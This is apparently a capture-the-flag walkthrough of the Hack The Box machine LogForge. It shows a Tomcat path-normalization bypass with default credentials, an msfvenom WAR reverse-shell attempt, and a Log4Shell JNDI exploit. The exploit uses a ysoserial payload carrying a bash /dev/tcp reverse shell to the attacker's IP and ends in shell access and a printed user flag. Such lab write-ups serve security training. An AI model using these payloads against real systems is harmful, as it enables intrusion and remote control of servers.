# # `Enumeration` -

Visiting the web page -

![[Pasted image 20220107104446.png]]

We viewed the source code nothing intersting there.

#### `Header` -

```bash
root@napster:~/Documents/HTB/LogForge# curl -I 10.10.11.138
HTTP/1.1 200 
Date: Fri, 07 Jan 2022 15:48:28 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Set-Cookie: JSESSIONID=62E9BE4029F24B9E0A120FBF93EB24EE; Path=/; HttpOnly
````

The `JSESSIONID` shows that it's using java.

#### `Gobuster` -

We ran gobuster to find out directories -

```bash
root@napster:~/Documents/HTB/LogForge# gobuster dir -u http://10.10.11.138/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.11.138/
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/01/07 10:54:03 Starting gobuster
===============================================================
/images (Status: 302)
/admin (Status: 403)
/manager (Status: 403)
/. (Status: 200)
```

`/manager` suggests that it my be a tomcat server
`/admin` could be interesting, but returns 403 Forbidden.Other than that nothing interesting.

# # `Breaking Parser Logic` -

On visiting `/admin` -

![[Pasted image 20220107110414.png]]

We get an `Apache` error

On visiting some directory that doesn't exist like `/admins` -

![[Pasted image 20220107110551.png]]

We get an `Tomcat` error.

The web page is being hosted on **Tomcat/9.0.31**, but our nmap scan and the forbidden response state that the web server runs on **Apache** **httpd 2.4.41**

We also know that port 8080 showed up as filtered in the nmap scan (8080 is the default for Tomcat). We should make a note of this fact, as this most likely suggests a `reverse proxy` at play.

#### `Reverse Proxy` - Apache httpd 2.4.41  
#### `Origin/Back end Server` - Tomcat/9.0.31

Reference - [Breaking Parser Logic](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

In short we can try to access `/manager` like this -

Url - `http://10.10.11.138/napster/..;/manager/html`

![[Pasted image 20220107111922.png]]

And we were prompted for username and password.On entering the username and password as `tomcat:tomcat` we were able to successfully login -

![[Pasted image 20220107112238.png]]

#### `.WAR Payload` -

Now that we have access to the web management interface of Tomcat we can try to upload and deploy a WAR (Web Application Archive) backdoor file, to achieve persistent shell access -

Creating  `.war` file using msfvenom -

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.127 LPORT=9001 -f war -o shell.war
Payload size: 1086 bytes
Final size of war file: 1086 bytes
Saved as: shell.war
```

Now upload it -

![[Pasted image 20220110124022.png]]

But it failed -

![[Pasted image 20220110124144.png]]

Looks like we cant upload files more than the size of 1 bytes.So we cant get our reverse shell through this method.

# # `Log4j` -

We know that Tomcat is Java based,this means that there is a strong likelihood that log4j is supported and is being used for logging. We can quickly check if it’s vulnerable to [log4shell](https://www.lunasec.io/docs/blog/log4j-zero-day/) by passing the following JNDI exploit strings in one of the text boxes that allow user input -

```bash
${jndi:ldap://10.10.14.127:9001/file}
```

![[Pasted image 20220107120859.png]]

Start your netcat listener -

```bash
root@napster:~/Documents/HTB/LogForge# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.127] from (UNKNOWN) [10.10.11.138] 56976
0
 `

```

And indeed we see a connection.

Now to get a proper reverse shell we need some tools -

1. We will use a slightly tweaked version of ysoserial called [ysoserial-modiefied](https://github.com/pimps/ysoserial-modified). This allows us to use more complex commands in our payload.

```bash
root@napster:/opt# git clone https://github.com/pimps/ysoserial-modified
Cloning into 'ysoserial-modified'...
remote: Enumerating objects: 324, done.
remote: Total 324 (delta 0), reused 0 (delta 0), pack-reused 324
Receiving objects: 100% (324/324), 84.22 MiB | 256.00 KiB/s, done.
Resolving deltas: 100% (94/94), done.
```

2. We will use [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit) to provide LDAP services and also since it supports staging ysoserial payloads.

```bash
root@napster:/opt# git clone https://github.com/pimps/JNDI-Exploit-Kit
Cloning into 'JNDI-Exploit-Kit'...
remote: Enumerating objects: 328, done.
remote: Counting objects: 100% (328/328), done.
remote: Compressing objects: 100% (232/232), done.
remote: Total 328 (delta 123), reused 230 (delta 61), pack-reused 0
Receiving objects: 100% (328/328), 27.74 MiB | 802.00 KiB/s, done.
Resolving deltas: 100% (123/123), done.
```

#### `Interaction` -

```bash
root@napster:/opt/ysoserial-modified/target# java -jar ysoserial-modified.jar -h
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                           
Y SO SERIAL?                                                                                                                            
Usage: java -jar ysoserial-[version]-all.jar [payload type] [terminal type: cmd / bash / powershell / none] '[command to execute]'      
   ex: java -jar ysoserial-[version]-all.jar CommonsCollections5 bash 'touch /tmp/ysoserial'                                            
        Available payload types:                                                                                                        
                BeanShell1 [org.beanshell:bsh:2.0b5]                                                                                    
                C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]                                                
                CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-loggi
ng:commons-logging:1.2]
                CommonsCollections1 [commons-collections:commons-collections:3.1]
                CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
                CommonsCollections3 [commons-collections:commons-collections:3.1]
                CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
                CommonsCollections5 [commons-collections:commons-collections:3.1]
                CommonsCollections6 [commons-collections:commons-collections:3.1]
                FileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4]
                Groovy1 [org.codehaus.groovy:groovy:2.3.9]
                Hibernate1 []
                Hibernate2 []
                JBossInterceptors1 [javassist:javassist:3.12.1.GA, org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
                JRMPClient []
                JRMPListener []
                JSON1 [net.sf.json-lib:json-lib:jar:jdk15:2.4, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2, commons-lang:commons-lang:2.6, net.sf.ezmorph:ezmorph:1.0.6, commons-beanutils:commons-beanutils:1.9.2, org.springframework:spring-core:4.1.4.RELEASE, commons-collections:commons-collections:3.1]
                JavassistWeld1 [javassist:javassist:3.12.1.GA, org.jboss.weld:weld-core:1.1.33.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
                Jdk7u21 []
                Jython1 [org.python:jython-standalone:2.5.2]
                MozillaRhino1 [rhino:js:1.7R2]
                Myfaces1 []
                Myfaces2 []
                ROME [rome:rome:1.0]
                Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
                Spring2 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2]
                Wicket1 [wicket-util:wicket-util:6.23]
```

#### `Payload` -

`CommonCollections` set of gadget chains is a good place to start. We will use the following command that contains a bash one-liner to create a serialized payload  `payload.ser`:

```bash
root@napster:/opt/ysoserial-modified/target# java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.127/9001 0>&1' > ~/Documents/HTB/LogForge/payload.ser
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/opt/ysoserial-modified/target/ysoserial-modified.jar) to field javax.management.BadAttributeValueExpException.val
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
```

It throws some warning but the file was created successfully-

```bash
root@napster:~/Documents/HTB/LogForge# ls -la
total 24
drwxr-xr-x   4 root root 4096 Jan  7 12:41 .
drwxr-xr-x 119 root root 4096 Jan  6 10:25 ..
-rw-r--r--   1 root root  112 Jan  7 10:55 gobuster.txt
drwxr-xr-x   4 root root 4096 Jan  7 12:08 LogForge
drwxr-xr-x   2 root root 4096 Jan  7 10:39 nmap
-rw-r--r--   1 root root 2069 Jan  7 12:41 payload.ser
```

Now we go into JNDI-Exploit-Kit/target to stand up an Ldap server that hosts our payload we just created -

```bash
root@napster:/opt/JNDI-Exploit-Kit/target# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.127:1389 -P ~/Documents/HTB/LogForge/payload.ser 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                           
       _ _   _ _____ _____      ______            _       _ _          _  ___ _                                                         
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |                                                        
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_                                                       
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|                                                      
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_                                                       
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|                                                      
                                           | |                                                                                          
                                           |_|               created by @welk1n                                                         
                                                             modified by @pimps 

[HTTP_ADDR] >> 10.10.14.127
[RMI_ADDR] >> 10.10.14.127
[LDAP_ADDR] >> 10.10.14.127
[COMMAND] >> open /System/Applications/Calculator.app
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in
 classpath):
rmi://10.10.14.127:1099/o4hwev
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.10.14.127:1099/ahq1tt
ldap://10.10.14.127:1389/ahq1tt
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.14.127:1099/gffi4x
ldap://10.10.14.127:1389/gffi4x
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.14.127:1099/lwtdju
ldap://10.10.14.127:1389/lwtdju
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.14.127:1099/aelly6
ldap://10.10.14.127:1389/aelly6
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.10.14.127:1099/2spnfl

----------------------------Server Log----------------------------
2022-01-07 12:51:09 [JETTYSERVER]>> Listening on 10.10.14.127:8180
2022-01-07 12:51:10 [RMISERVER]  >> Listening on 10.10.14.127:1099
2022-01-07 12:51:11 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

We get options for various links to be used with our JNDI string, for the different JDK versions. We will assume that the target tomcat server uses v1.8 and use the following exploit string:

```bash
ldap://10.10.14.127:1389/gffi4x
```

Now start your listener 
And like we did earlier paste the payload in one of the boxes and send it -

Payload - `${jndi:ldap://10.10.14.127:1389/gffi4x}`

![[Pasted image 20220107130249.png]]

And we got our shell -

![[Pasted image 20220107130437.png]]

```bash
root@napster:~/Documents/HTB/LogForge# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.127] from (UNKNOWN) [10.10.11.138] 57080
bash: cannot set terminal process group (840): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$
```

# # `User` -

```bash
tomcat@LogForge:/var/lib/tomcat9$ ls
conf  lib  logs  policy  webapps  work
tomcat@LogForge:/var/lib/tomcat9$ cd /home/
tomcat@LogForge:/home$ ls
htb
tomcat@LogForge:/home$ cd htb
tomcat@LogForge:/home/htb$ ls
user.txt
tomcat@LogForge:/home/htb$ cat user.txt 
132ebd3c0492409e4d587b44562417b5
tomcat@LogForge:/home/htb$
```